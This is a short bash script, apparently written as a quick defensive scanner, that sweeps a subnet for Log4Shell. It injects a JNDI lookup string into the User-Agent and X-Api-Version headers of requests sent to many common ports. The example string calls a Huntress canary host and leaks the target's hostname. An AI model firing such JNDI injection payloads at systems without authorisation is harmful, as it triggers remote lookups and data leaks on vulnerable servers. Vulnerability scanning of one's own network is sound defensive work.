#!/bin/bash

# Created by matthew.bates@octoconsulting.com as a quick and dirty way to detect Log4Shell presence in a given subnet
# Please feel free to adjust what ports you would like to check (consider scanning your subnet with nmap first)

open https://log4shell.huntress.com/
echo 'Please enter the Huntress generated identifier that looks like the following: "${jndi:ldap://log4shell.huntress.com:1389/hostname=${env:HOSTNAME}/d08ad09a-b02b-418a-a40d-5cdfe6e48326}"'
read HUNTRESS

echo 'Please enter the URL for the JSON results provided by Huntress:'
read HUNTRESS_JSON

echo 'Enter the subnet you would like to scan: (example: 10.101.1.0/24)'
read MYSUBNET

# https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Infrastructure/common-http-ports.txt
PORTS=(
66
80
81
443
445
457
1080
1100
1241
1352
1433
1434
1521
1944
2301
3000
3128
3306
4000
4001
4002
4443
4100
5000
5432
5800
5801
5802
6346
6347
7001
7002
8080
8081
8443
8888
9091
9443
9999
10443
30821
54321
)

MYIPS="
$(nmap -n -sL ${MYSUBNET} | awk '{print $NF}' | tr -d '[:alpha:]' | tr '\n' ' ')
"

function cleanup {
	echo "KILLING CHILDREN"
	ps -ef | grep wget | awk '{print $2}' | xargs kill
	exit 255
}

trap cleanup 2 3


SUBNET_LOG="$(echo ${MYSUBNET} | sed s#/#_#g).log"
for MYIP in ${MYIPS}; do
	(ping -c 1 -t 1 ${MYIP}) && {
		for MYPORT in ${PORTS[@]}; do
			echo "=== ${MYIP}:${MYPORT} ==="
			echo "curl -m 5 -vvv -A '${HUNTRESS}' -H ‘X-Api-Version: ${HUNTRESS}’ ${MYIP}:${MYPORT}"
			curl -k -f -m 5 -vvv -A "${HUNTRESS}" -H "X-Api-Version: ${HUNTRESS}" ${MYIP}:${MYPORT} &
			curl -k -f -m 5 -vvv -A "${HUNTRESS}" -H "X-Api-Version: ${HUNTRESS}" https://${MYIP}:${MYPORT} &
			echo "wget --timeout=5 --tries=5 --delete-after --no-check-certificate --user-agent='${HUNTRESS}' ${MYIP}:${MYPORT}"
			wget --timeout=5 --tries=5 --delete-after --no-check-certificate --user-agent="${HUNTRESS}" ${MYIP}:${MYPORT} &
			wget --timeout=5 --tries=5 --delete-after --no-check-certificate --user-agent="${HUNTRESS}" https://${MYIP}:${MYPORT} &
		done
		sleep 5
	}
done | tee log4shell_scanner_${SUBNET_LOG} 2>&1

wget -O huntress_json_report_${SUBNET_LOG} ${HUNTRESS_JSON}

echo "Report results available at:"
echo log4shell_scanner_${SUBNET_LOG}
echo huntress_json_report_${SUBNET_LOG}
